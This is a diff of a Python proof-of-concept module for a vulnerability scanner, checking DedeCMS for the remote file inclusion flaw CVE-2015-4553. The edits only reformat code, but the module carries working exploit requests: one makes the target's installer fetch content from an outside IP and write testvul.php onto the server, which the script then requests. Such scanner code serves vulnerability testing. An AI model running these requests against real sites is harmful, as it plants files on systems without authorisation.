@@ -3,11 +3,12 @@
 from CScanPoc.thirdparty import requests, hackhttp
 from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
 
+
 class Vuln(ABVuln):
-    vuln_id = 'DedeCMS_0001' # 平台漏洞编号，留空
+    vuln_id = 'DedeCMS_0001'  # 平台漏洞编号，留空
     name = '织梦CMS Remote File Inclusion'  # 漏洞名称
     level = VulnLevel.HIGH  # 漏洞危害级别
-    type = VulnType.RFI # 漏洞类型
+    type = VulnType.RFI  # 漏洞类型
     disclosure_date = '2015-06-14'  # 漏洞公布时间
     desc = '''
         DedeCMS /install/index.php 远程文件包含漏洞。
@@ -17,6 +18,7 @@ class Vuln(ABVuln):
     cve_id = 'CVE-2015-4553'  # cve编号
     product = 'DedeCMS(织梦CMS)'  # 漏洞应用名称
     product_version = '< 5.7-sp1'  # 漏洞应用版本
+
 
 class Poc(ABPoc):
     poc_id = '4ceba250-ab25-4512-902f-473285640eb8'
@@ -30,7 +32,7 @@ class Poc(ABPoc):
         try:
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
-            
+
             #audit(assign('dedecms', 'http://localhost:8080/DedeCMS-V5.7-UTF8-SP1-Full/uploads/')[1])
             hh = hackhttp.hackhttp()
             path = '/install/index.php'
@@ -38,11 +40,14 @@ class Poc(ABPoc):
             payload2 = '?step=11&insLockfile=utf-8&s_lang=utf-8&install_demo_name=testvul.php&updateHost=http://118.126.10.60/base-v57/'
             testvul = '/install/testvul.php'
 
-            code, head, res, errcode, _ = hh.http(self.target + path + payload1)
+            code, head, res, errcode, _ = hh.http(
+                self.target + path + payload1)
             if code == 200 and '远程获取失败' in res:
-                code, head, res, errcode, _ = hh.http(self.target + path + payload2)
+                code, head, res, errcode, _ = hh.http(
+                    self.target + path + payload2)
                 if code == 200 and '存在(您可以选择安装进行体验)' in res:
-                    code, head, res, errcode, _ = hh.http(self.target + testvul)
+                    code, head, res, errcode, _ = hh.http(
+                        self.target + testvul)
                     if code == 200 and 'INSERT INTO' in res:
                         self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                             target=self.target, name=self.vuln.name))
@@ -52,6 +57,7 @@ class Poc(ABPoc):
 
     def exploit(self):
         self.verify()
+
 
 if __name__ == '__main__':
     Poc().run()
